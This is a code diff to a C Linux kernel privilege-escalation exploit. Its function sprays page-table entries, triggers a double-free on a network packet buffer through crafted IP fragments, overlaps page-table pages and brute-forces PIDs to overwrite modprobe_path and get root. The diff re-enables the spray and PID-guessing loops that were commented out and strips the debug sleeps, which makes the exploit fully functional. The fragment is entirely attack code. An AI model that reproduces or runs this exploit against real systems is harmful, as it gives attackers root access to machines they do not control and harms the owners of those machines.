@@ -327,13 +327,12 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	}
 
 	// spray-allocate the PTEs from PCP allocator order-0 list
-	/*
 	printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
 	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
-		*(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0xbabebabe;
+		*(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x41;
 
 	PRINTF_VERBOSE("[*] double-freeing skb...\n");
-*/
+
 	// cause double-free on skb from earlier
 	df_ip_header.ip_id = 0x1337;
 	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
@@ -343,7 +342,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	// causes end == offset in ip_frag_queue(). packet will be empty
 	// remains running until after both frees, a.k.a. does not require sleep
 	alloc_intermed_buf_hdr(0, &df_ip_header);
-	//sleep(9999);
+
 	// allocate overlapping PMD page (overlaps with PTE)
 	*(unsigned long long*)_pmd_area = 0xCAFEBABE;
 	void *_pmd_area1[20];
@@ -458,7 +457,6 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 				PRINTF_VERBOSE("[*] modprobe_script_fd: %d, status_fd: %d\n", modprobe_script_fd, status_fd);
 				
 				printf("[*] overwriting path with PIDs in range 0->4194304...\n");
-				/*
 				for (pid_t pid_guess=0; pid_guess < 4194304; pid_guess++)
 				{
 					int status_cnt;
@@ -492,10 +490,9 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 
 					return;
 				}
-				*/
 
 				printf("[!] verified modprobe_path address does not work... CONFIG_STATIC_USERMODEHELPER enabled?\n");
-				sleep(500);
+
 				return;
 			}
 			
